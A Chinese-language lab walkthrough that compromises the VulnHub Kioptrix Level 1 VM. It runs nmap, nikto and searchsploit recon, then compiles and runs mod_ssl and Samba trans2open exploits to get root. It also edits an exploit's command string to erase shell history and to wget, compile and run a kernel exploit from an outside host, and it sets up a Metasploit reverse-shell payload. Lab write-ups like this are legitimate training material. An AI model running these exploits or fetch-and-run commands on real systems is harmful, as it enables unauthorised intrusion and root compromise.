# Kioptrix: Level 1

下载地址：

```
https://download.vulnhub.com/kioptrix/Kioptrix_Level_1.rar
```

## 实战操作

查找存活靶机IP地址

```
┌──(root💀kali)-[~/Desktop]
└─# netdiscover 
 Currently scanning: 192.168.47.0/16   |   Screen View: Unique Hosts                                                                                                                                          
                                                                                                                                                                                                              
 16 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 960                                                                                                                                             
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.32.1    00:50:56:c0:00:08     13     780  VMware, Inc.                                                                                                                                               
 192.168.32.2    00:50:56:e9:76:da      1      60  VMware, Inc.                                                                                                                                               
 192.168.32.135  00:0c:29:8f:d5:ec      1      60  VMware, Inc.                                                                                                                                               
 192.168.32.254  00:50:56:e1:f0:69      1      60  VMware, Inc.      
```

查看靶机IP对外开放的端口

```
┌──(root💀kali)-[~/Desktop]
└─# nmap 192.168.32.135 -sV                             
Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-11 08:22 EST
Nmap scan report for 192.168.32.135
Host is up (0.0026s latency).
Not shown: 994 closed ports
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 2.9p2 (protocol 1.99)
80/tcp    open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
111/tcp   open  rpcbind     2 (RPC #100000)
139/tcp   open  netbios-ssn Samba smbd (workgroup: ZMYGROUP)
443/tcp   open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
32768/tcp open  status      1 (RPC #100024)
MAC Address: 00:0C:29:8F:D5:EC (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.53 seconds

```

nikto扫描http服务，找到有RCE漏洞（**CVE-2002-0082**）。

`mod_ssl/2.8.4 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell. http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0082, OSVDB-756.`

```
┌──(root💀kali)-[~]
└─# nikto -host 192.168.32.135 
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.32.135
+ Target Hostname:    192.168.32.135
+ Target Port:        80
+ Start Time:         2021-12-11 09:14:49 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
+ Server may leak inodes via ETags, header found with file /, inode: 34821, size: 2890, mtime: Wed Sep  5 23:12:46 2001
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ OpenSSL/0.9.6b appears to be outdated (current is at least 1.1.1). OpenSSL 1.0.0o and 0.9.8zc are also current.
+ mod_ssl/2.8.4 appears to be outdated (current is at least 2.8.31) (may depend on server version)
+ Apache/1.3.20 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ OSVDB-27487: Apache is vulnerable to XSS via the Expect header
+ OSVDB-838: Apache/1.3.20 - Apache 1.x up 1.2.34 are vulnerable to a remote DoS and possible code execution. CAN-2002-0392.
+ OSVDB-4552: Apache/1.3.20 - Apache 1.3 below 1.3.27 are vulnerable to a local buffer overflow which allows attackers to kill any process on the system. CAN-2002-0839.
+ OSVDB-2733: Apache/1.3.20 - Apache 1.3 below 1.3.29 are vulnerable to overflows in mod_rewrite and mod_cgi. CAN-2003-0542.
+ mod_ssl/2.8.4 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell. http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0082, OSVDB-756.
+ Allowed HTTP Methods: GET, HEAD, OPTIONS, TRACE 
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ ///etc/hosts: The server install allows reading of any system file by adding an extra '/' to the URL.
+ OSVDB-682: /usage/: Webalizer may be installed. Versions lower than 2.01-09 vulnerable to Cross Site Scripting (XSS).
+ OSVDB-3268: /manual/: Directory indexing found.
+ OSVDB-3092: /manual/: Web server manual found.
+ OSVDB-3268: /icons/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ OSVDB-3092: /test.php: This might be interesting...
+ /wp-content/themes/twentyeleven/images/headers/server.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ /wordpresswp-content/themes/twentyeleven/images/headers/server.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ /wp-includes/Requests/Utility/content-post.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ /wordpresswp-includes/Requests/Utility/content-post.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ /wp-includes/js/tinymce/themes/modern/Meuhy.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ /wordpresswp-includes/js/tinymce/themes/modern/Meuhy.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ /assets/mobirise/css/meta.php?filesrc=: A PHP backdoor file manager was found.
+ /login.cgi?cli=aa%20aa%27cat%20/etc/hosts: Some D-Link router remote command execution.
+ /shell?cat+/etc/hosts: A backdoor was identified.
+ 8724 requests: 0 error(s) and 30 item(s) reported on remote host
+ End Time:           2021-12-11 09:15:15 (GMT-5) (26 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```

### mod\_ssl RCE

查找EXP

```
┌──(root💀kali)-[~]
└─# searchsploit mod_ssl
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                             |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Apache mod_ssl 2.0.x - Remote Denial of Service                                                                                                                                                            | linux/dos/24590.txt
Apache mod_ssl 2.8.x - Off-by-One HTAccess Buffer Overflow                                                                                                                                                 | multiple/dos/21575.txt
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuck.c' Remote Buffer Overflow                                                                                                                                       | unix/remote/21671.c
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (1)                                                                                                                                 | unix/remote/764.c
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (2)                                                                                                                                 | unix/remote/47080.c
Apache mod_ssl OpenSSL < 0.9.6d / < 0.9.7-beta2 - 'openssl-too-open.c' SSL2 KEY_ARG Overflow                                                                                                               | unix/remote/40347.txt
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

复制三个exp测试效果

```
┌──(root💀kali)-[~]
└─# find / -name "21671.c"                                                                                                                                                
/usr/share/exploitdb/exploits/unix/remote/21671.c
                                                                                                                                                                                                                                             
┌──(root💀kali)-[~]
└─# cp /usr/share/exploitdb/exploits/unix/remote/21671.c /tmp
                                                                                                                                                                                                                                             
┌──(root💀kali)-[~]
└─# cp /usr/share/exploitdb/exploits/unix/remote/764.c /tmp  
                                                                                                                                                                                                                                             
┌──(root💀kali)-[~]
└─# cp /usr/share/exploitdb/exploits/unix/remote/47080.c /tmp

```

编译21671.c错误

```
┌──(root💀kali)-[/tmp]
└─# gcc -o 21671 21671.c                                                                                                                                                                                                                 1 ⨯
21671.c:27:10: fatal error: openssl/ssl.h: No such file or directory
   27 | #include <openssl/ssl.h>
      |          ^~~~~~~~~~~~~~~
compilation terminated.
```

安装openssl依赖文件

```
┌──(root💀kali)-[/tmp]
└─# apt install -y libssl-dev libssl1.0-dev
```

在764.c里面加入下面几句，就可以编译成功

```
#include <openssl/rc4.h>
#include <openssl/md5.h>

#define SSL2_MT_ERROR 0
#define SSL2_MT_CLIENT_FINISHED 3
#define SSL2_MT_SERVER_HELLO 4
#define SSL2_MT_SERVER_VERIFY 5
#define SSL2_MT_SERVER_FINISHED 6
#define SSL2_MAX_CONNECTION_ID_LENGTH 16  
```

这个站好像死了，我们换另外一个网站的

![](<../../.gitbook/assets/image (18) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

位置在这里624行，修改成下面

```
#define COMMAND2 "unset HISTFILE; cd /tmp; wget https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c; gcc -o p ptrace-kmod.c; rm ptrace-kmod.c; ./p; \n"
```

![](<../../.gitbook/assets/image (19) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

OK，搞定了

![](<../../.gitbook/assets/image (15) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

### smb RCE

使用msfconsole扫描samba版本是2.2

```
┌──(root💀kali)-[~/Desktop]
└─# msfconsole             
msf6 > use auxiliary/scanner/smb/smb_version 
msf6 auxiliary(scanner/smb/smb_version) > set rhosts 192.168.0.9
rhosts => 192.168.0.9
msf6 auxiliary(scanner/smb/smb_version) > run

[*] 192.168.0.9:139       - SMB Detected (versions:) (preferred dialect:) (signatures:optional)
[*] 192.168.0.9:139       -   Host could not be identified: Unix (Samba 2.2.1a)
[*] 192.168.0.9:          - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

使用searchsploit搜索可利用脚本

```
┌──(root💀kali)-[~/Desktop]
└─# searchsploit samba 2.2
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                             |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Samba 2.0.x/2.2 - Arbitrary File Creation                                                                                                                                                                  | unix/remote/20968.txt
Samba 2.2.0 < 2.2.8 (OSX) - trans2open Overflow (Metasploit)                                                                                                                                               | osx/remote/9924.rb
Samba 2.2.2 < 2.2.6 - 'nttrans' Remote Buffer Overflow (Metasploit) (1)                                                                                                                                    | linux/remote/16321.rb
Samba 2.2.8 (BSD x86) - 'trans2open' Remote Overflow (Metasploit)                                                                                                                                          | bsd_x86/remote/16880.rb
Samba 2.2.8 (Linux Kernel 2.6 / Debian / Mandrake) - Share Privilege Escalation                                                                                                                            | linux/local/23674.txt
Samba 2.2.8 (Linux x86) - 'trans2open' Remote Overflow (Metasploit)                                                                                                                                        | linux_x86/remote/16861.rb
Samba 2.2.8 (OSX/PPC) - 'trans2open' Remote Overflow (Metasploit)                                                                                                                                          | osx_ppc/remote/16876.rb
Samba 2.2.8 (Solaris SPARC) - 'trans2open' Remote Overflow (Metasploit)                                                                                                                                    | solaris_sparc/remote/16330.rb
Samba 2.2.8 - Brute Force Method Remote Command Execution                                                                                                                                                  | linux/remote/55.c
Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow (1)                                                                                                                                                 | unix/remote/22468.c
Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow (2)                                                                                                                                                 | unix/remote/22469.c
Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow (3)                                                                                                                                                 | unix/remote/22470.c
Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow (4)                                                                                                                                                 | unix/remote/22471.txt
Samba 2.2.x - 'nttrans' Remote Overflow (Metasploit)                                                                                                                                                       | linux/remote/9936.rb
Samba 2.2.x - CIFS/9000 Server A.01.x Packet Assembling Buffer Overflow                                                                                                                                    | unix/remote/22356.c
Samba 2.2.x - Remote Buffer Overflow                                                                                                                                                                       | linux/remote/7.pl
Samba < 2.2.8 (Linux/BSD) - Remote Code Execution                                                                                                                                                          | multiple/remote/10.c
Samba < 2.2.8 (Linux/BSD) - Remote Code Execution                                                                                                                                                          | multiple/remote/10.c
Samba < 3.0.20 - Remote Heap Overflow                                                                                                                                                                      | linux/remote/7701.txt
Samba < 3.6.2 (x86) - Denial of Service (PoC)                                                                                                                                                              | linux_x86/dos/36741.py
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

编译EXP，并且直接连接到靶场。

```
┌──(root💀kali)-[~/Desktop]
└─# cd /tmp

┌──(root💀kali)-[/tmp]
└─# cp /usr/share/exploitdb/exploits/multiple/remote/10.c /tmp

┌──(root💀kali)-[/tmp]
└─# gcc -o exp 10.c                                                                 

┌──(root💀kali)-[/tmp]
└─# chmod +x exp                                              

┌──(root💀kali)-[/tmp]
└─# ./exp       
samba-2.2.8 < remote root exploit by eSDee (www.netric.org|be)
--------------------------------------------------------------
Usage: ./exp [-bBcCdfprsStv] [host]

-b <platform>   bruteforce (0 = Linux, 1 = FreeBSD/NetBSD, 2 = OpenBSD 3.1 and prior, 3 = OpenBSD 3.2)
-B <step>       bruteforce steps (default = 300)
-c <ip address> connectback ip address
-C <max childs> max childs for scan/bruteforce mode (default = 40)
-d <delay>      bruteforce/scanmode delay in micro seconds (default = 100000)
-f              force
-p <port>       port to attack (default = 139)
-r <ret>        return address
-s              scan mode (random)
-S <network>    scan mode
-t <type>       presets (0 for a list)
-v              verbose mode

┌──(root💀kali)-[/tmp]
└─# ./exp -b0 192.168.0.9                                                                                                                                                                                                              
samba-2.2.8 < remote root exploit by eSDee (www.netric.org|be)
--------------------------------------------------------------
+ Bruteforce mode. (Linux)
+ Host is running samba.
+ Worked!
--------------------------------------------------------------
*** JE MOET JE MUIL HOUWE
Linux kioptrix.level1 2.4.7-10 #1 Thu Sep 6 16:46:36 EDT 2001 i686 unknown
uid=0(root) gid=0(root) groups=99(nobody)
whoami
root

```

## call_trans2open(RBO)



```
┌──(root💀kali)-[/tmp]
└─# msfconsole 
msf6 > search trans2open

Matching Modules
================

   #  Name                              Disclosure Date  Rank   Check  Description
   -  ----                              ---------------  ----   -----  -----------
   0  exploit/freebsd/samba/trans2open  2003-04-07       great  No     Samba trans2open Overflow (*BSD x86)
   1  exploit/linux/samba/trans2open    2003-04-07       great  No     Samba trans2open Overflow (Linux x86)
   2  exploit/osx/samba/trans2open      2003-04-07       great  No     Samba trans2open Overflow (Mac OS X PPC)
   3  exploit/solaris/samba/trans2open  2003-04-07       great  No     Samba trans2open Overflow (Solaris SPARC)


Interact with a module by name or index. For example info 3, use 3 or use exploit/solaris/samba/trans2open

msf6 > use exploit/linux/samba/trans2open
[*] No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp
msf6 exploit(linux/samba/trans2open) > set rhosts 192.168.0.9
rhosts => 192.168.0.9
msf6 exploit(linux/samba/trans2open) > set lrhosts 192.168.0.8
lrhosts => 192.168.0.8
msf6 exploit(linux/samba/trans2open) > set payload linux/x86/meterpreter/reverse_tcp
payload => linux/x86/meterpreter/reverse_tcp
msf6 exploit(linux/samba/trans2open) > run

```

